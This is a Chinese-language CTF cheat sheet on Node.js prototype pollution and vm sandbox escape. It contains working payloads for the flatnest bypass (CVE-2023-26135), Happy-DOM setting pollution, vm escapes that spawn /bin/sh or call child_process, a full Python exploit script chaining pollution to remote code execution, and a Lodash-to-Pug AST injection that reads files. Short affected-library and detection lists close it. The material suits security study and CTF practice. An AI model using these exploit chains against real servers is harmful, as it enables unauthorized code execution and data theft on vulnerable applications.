# CTF Web - Node.js 原型污染与 VM 逃逸

## 目录
- [原型污染基础](#原型污染基础)
  - [常见载体](#常见载体)
  - [已知存在漏洞的库](#已知存在漏洞的库)
- [flatnest 循环引用绕过（CVE-2023-26135）](#flatnest-循环引用绕过cve-2023-26135)
- [Gadget：经原型链读取库配置](#gadget经原型链读取库配置)
- [Node.js VM 沙箱逃逸](#nodejs-vm-沙箱逃逸)
  - [兼容 ESM 的逃逸（CVE-2025-61927）](#兼容-esm-的逃逸cve-2025-61927)
  - [CommonJS 逃逸](#commonjs-逃逸)
  - [为什么 Happy-DOM 里 `document.write` 很关键](#为什么-happy-dom-里-documentwrite-很关键)
- [完整链条：原型污染到 VM 逃逸 RCE（4llD4y）](#完整链条原型污染到-vm-逃逸-rce4lld4y)
- [Lodash 原型污染到 Pug AST 注入（VuwCTF 2025）](#lodash-原型污染到-pug-ast-注入vuwctf-2025)
- [受影响的库](#受影响的库)
- [检测](#检测)

---

<a id="prototype-pollution-basics"></a>
## 原型污染基础

JavaScript 对象继承自 `Object.prototype`。污染它会影响所有对象：
```javascript
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true
```

<a id="common-vectors"></a>
### 常见载体
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}
```

<a id="known-vulnerable-libraries"></a>
### 已知存在漏洞的库
- `flatnest`（CVE-2023-26135）—— `nest()` 可通过循环引用绕过
- `merge`、`lodash.merge`（旧版）、`deep-extend`、`qs`（旧版）

---

<a id="flatnest-circular-reference-bypass-cve-2023-26135"></a>
## flatnest 循环引用绕过（CVE-2023-26135）

**漏洞：** `insert()` 会拦截 `__proto__`/`constructor`，但 `seek()`（负责解析 `[Circular (path)]` 值）完全没有这类检查。

**代码流程：**
1. `nest(obj)` 遍历各键
2. 值匹配 `[Circular (path)]` → 调用 `seek(nested, path)`
3. `seek()` 自由穿越 `constructor.prototype` → 返回 `Object.prototype`
4. 后续键直接写入 `Object.prototype`

**利用：**
```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

**注意：** 1.0.1 的"修复"只保护了 `insert()`，没管 `seek()`。完全未修复。

---

<a id="gadget-library-settings-via-prototype-chain"></a>
## Gadget：经原型链读取库配置

**模式：** 库从 options 对象读取可选配置。调用方没提供该配置 → 沿原型链落到 `Object.prototype`。

**Happy-DOM 示例（v20.x）：**
```javascript
// Window constructor:
constructor(options) {
  const browser = new DetachedBrowser(BrowserWindow, {
    settings: options?.settings  // options = { console }, no own 'settings'
    // With pollution: Object.prototype.settings = { enableJavaScriptEvaluation: true }
  });
}
```

---

<a id="nodejs-vm-sandbox-escape"></a>
## Node.js VM 沙箱逃逸

**`vm` 不是安全边界。** 跨越边界的对象仍持有宿主上下文的引用。

<a id="esm-compatible-escape-cve-2025-61927"></a>
### 兼容 ESM 的逃逸（CVE-2025-61927）
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true, writable: false },
    { type: "pipe", readable: false, writable: true },
    { type: "pipe", readable: false, writable: true }
  ]
});
const output = Buffer.from(result.output[1]).toString();
```

<a id="commonjs-escape"></a>
### CommonJS 逃逸
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

<a id="why-documentwrite-matters-for-happy-dom"></a>
### 为什么 Happy-DOM 里 `document.write` 很关键
`document.write()` 创建解析器时带 `evaluateScripts: true` → 脚本不会被标记 `disableEvaluation`。剩下的唯一检查是 `browserSettings.enableJavaScriptEvaluation`（可通过原型污染绕过）。

---

<a id="full-chain-prototype-pollution-to-vm-escape-rce-4lld4y"></a>
## 完整链条：原型污染到 VM 逃逸 RCE（4llD4y）

**架构：**
1. 污染 `Object.prototype.settings`，在 Happy-DOM 中开启 JS 求值
2. 经 `document.write()` 提交含 `<script>` 的 HTML（它会设置 `evaluateScripts: true`）
3. 脚本在 VM 中执行，通过 `this.constructor.constructor` 逃逸，拿到 RCE

**完整利用：**
```python
import requests
TARGET = "http://target:3000"

# Step 1: Pollution via flatnest circular reference
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# Step 2: RCE via VM escape in rendered HTML
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

---

---

<a id="lodash-prototype-pollution-to-pug-ast-injection-vuwctf-2025"></a>
## Lodash 原型污染到 Pug AST 注入（VuwCTF 2025）

**存在漏洞：** Lodash < 4.17.5 的 `_.merge()` 允许经 `constructor.prototype` 做原型污染。

**Pug 模板引擎 gadget：** Pug 会在 AST 节点上查找 `block` 属性。若节点自身没有 `block`，JS 会沿原型链查找 → 命中被污染的 `Object.prototype.block`。

**Payload：**
```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

**投递：** 把 JSON 做 base64 编码，以 `?data=<encoded>` 发送。

**原理：**
1. 对用户输入执行 `_.merge()`，把 `Object.prototype.block` 设为恶意 AST 节点
2. Pug 编译模板时检查每个节点的 `node.block`
3. 自身没有 `block` 的节点从原型继承 → 找到注入的 Text 节点
4. `type: "Text"` 配 `line:` payload，在模板编译期注入代码
5. 代码在服务端执行，读取 flag

**检测：** `package.json` 中 `lodash` < 4.17.5 且使用 Pug/Jade 模板引擎。

---

<a id="affected-libraries"></a>
## 受影响的库
- **happy-dom** < 20.0.0（默认开启 JS 求值）、20.x+（若经污染重新开启）
- **vm2**（已废弃）
- **realms-shim**
- **lodash** < 4.17.5（`_.merge()` 原型污染）

<a id="detection"></a>
## 检测
- `package.json` 中有 `flatnest`，且存在对用户输入调用 `nest()` 的端点
- `happy-dom` 或 `jsdom` 渲染用户可控 HTML
- 任何 `vm.runInContext`、`vm.Script` 用法
